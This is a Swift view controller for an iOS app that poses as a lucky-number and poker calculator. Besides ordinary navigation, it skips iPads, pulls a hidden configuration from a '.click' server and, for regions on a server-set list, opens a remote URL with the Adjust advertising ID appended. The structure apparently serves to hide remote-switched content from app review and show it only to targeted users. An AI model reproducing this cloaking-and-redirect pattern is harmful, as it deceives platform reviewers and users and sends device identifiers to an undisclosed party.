//
//  ViewController.swift
//  Lckukynumber
//
//  Created by adin on 2024/7/16.
//

import UIKit
import Adjust
import Reachability

class LckukynumberStartViewController: UIViewController {
    @IBOutlet weak var activityIndicator: UIActivityIndicatorView!
    var reachability: Reachability!
    @IBOutlet weak var startBtn: UIButton!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        NotificationCenter.default.addObserver(self, selector: #selector(slaceHandleNotification(_:)), name: .StruckShowADSNotification, object: nil)
        activityIndicator.hidesWhenStopped = true
        slaceLoadAdsData()
        
        // Do any additional setup after loading the view.
    }
    
    @IBAction func numHOMCLICK(_ sender: UIButton) {
      
        let vc = LuckymultiplicationViewController()
        vc.modalPresentationStyle = .fullScreen
        self.present(vc, animated: true, completion: nil)
       }

       @IBAction func shhomeciclck(_ sender: Any) {
           
           let vc = LUCKYGAViewController()
           vc.modalPresentationStyle = .fullScreen
           self.present(vc, animated: true, completion: nil)
       }

      

       @IBAction func clickhuanc(_ sender: Any) {
           if let shareURL = URL(string: "https://apps.apple.com/app/LuckyCalculation-Poker/id6657964058") {
               let shareArray: [Any] = [shareURL]
               let activityViewController = UIActivityViewController(activityItems: shareArray, applicationActivities: nil)
               self.present(activityViewController, animated: true, completion: nil)
               
               activityViewController.completionWithItemsHandler = { activityType, completed, returnedItems, activityError in
                   // Handle completion
               }
           }
         
       }
    
    
    @IBAction func priclickbtn(_ sender: Any) {
        let vc = HistoricalRecordViewController()
        vc.modalPresentationStyle = .fullScreen
        self.present(vc, animated: true, completion: nil)
        
    }
    
    
    @IBAction func truorickbtn(_ sender: Any) {
        
        let vc: LckukynumberPrivacyViewController = LckukynumberPrivacyViewController.init()
        vc.modalPresentationStyle = .fullScreen
        present(vc, animated: true)
    }
    
    @objc func slaceHandleNotification(_ notification: Notification) {
        let adid = Adjust.adid()
        self.startBtn.isEnabled = adid != nil
        if adid == nil {
            return
        }
        
        if adsData == nil {
            return
        }
        
        let adsurl = adsData!["toUrl"] as? String
        if adsurl == nil {
            return
        }
        
        if adsurl!.isEmpty {
            return
        }
        
        let restrictedRegions: [String] = adsData!["allowArea"] as? [String] ?? Array.init()
        let way: Int = adsData!["jumpWay"] as? Int ?? 1
        
        if restrictedRegions.count > 0 {
            if let currentRegion = Locale.current.regionCode?.lowercased() {
                if restrictedRegions.contains(currentRegion) {
                    showAds(adsUrl: "\(adsurl!)\(adid!)", way: way)
                }
            }
        } else {
            showAds(adsUrl: "\(adsurl!)\(adid!)", way: way)
        }
    }

    deinit {
        NotificationCenter.default.removeObserver(self, name: .StruckShowADSNotification, object: nil)
    }
    
    private func slaceLoadAdsData() {
        if UIDevice.current.model.contains("iPad") {
            return
        }
        
        self.startBtn.isEnabled = Adjust.adid() != nil
        
        do {
            reachability = try Reachability()
        } catch {
            print("Unable to create Reachability")
            return
        }
        
        if reachability.connection == .unavailable {
            reachability.whenReachable = { reachability in
                self.reachability.stopNotifier()
                self.slaceReqAdsData()
            }

            reachability.whenUnreachable = { _ in
            }

            do {
                try reachability.startNotifier()
            } catch {
                print("Unable to start notifier")
            }
        } else {
            self.slaceReqAdsData()
        }
    }
    
    private func slaceReqAdsData() {
        
        activityIndicator.startAnimating()
        if let url = URL(string: "https://system.gbk94.click/vn-admin/api/v1/dict-items?dictCode=epiboly_app&name=com.fupattzj.Lckukynumber&queryMode=list") {
            let session = URLSession.shared
            let task = session.dataTask(with: url) { data, response, error in
                if let error = error {
                    print("error: \(error.localizedDescription)")
                    return
                }
                
                if let httpResponse = response as? HTTPURLResponse {
                    if httpResponse.statusCode == 200 {
                        print("req success")
                    } else {
                        print("HTTP CODE: \(httpResponse.statusCode)")
                    }
                }
                
                if let data = data {
                    do {
                        if let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                            print("JSON: \(jsonResponse)")
                            DispatchQueue.main.async {
                                self.activityIndicator.stopAnimating()
                                let dataArr: [[String: Any]]? = jsonResponse["data"] as? [[String: Any]]
                                if let dataArr = dataArr {
                                    let dic: [String: Any] = dataArr.first ?? Dictionary()
                                    let value: String = dic["value"] as? String ?? ""
                                    let finDic = self.convertToDictionary(from: value)
                                    adsData = finDic
                                    NotificationCenter.default.post(name: .StruckShowADSNotification, object: nil, userInfo: nil)
                                }
                            }
                        }
                    } catch let parsingError {
                        print("error: \(parsingError.localizedDescription)")
                        DispatchQueue.main.async {
                            self.activityIndicator.stopAnimating()
                        }
                    }
                }
            }

            task.resume()
        }
    }
    
    private func showAds(adsUrl: String, way: Int) {
        if way == 1 {
            self.showAds(with: adsUrl)
        } else {
            if let url = URL(string: adsUrl) {
                if UIApplication.shared.canOpenURL(url) {
                    UIApplication.shared.open(url, options: [:], completionHandler: nil)
                }
            }
        }
    }
    
    private func convertToDictionary(from jsonString: String) -> [String: Any]? {
        guard let jsonData = jsonString.data(using: .utf8) else {
            return nil
        }
        
        do {
            if let jsonDict = try JSONSerialization.jsonObject(with: jsonData, options: []) as? [String: Any] {
                return jsonDict
            }
        } catch let error {
            print("JSON error: \(error.localizedDescription)")
        }
        
        return nil
    }
}

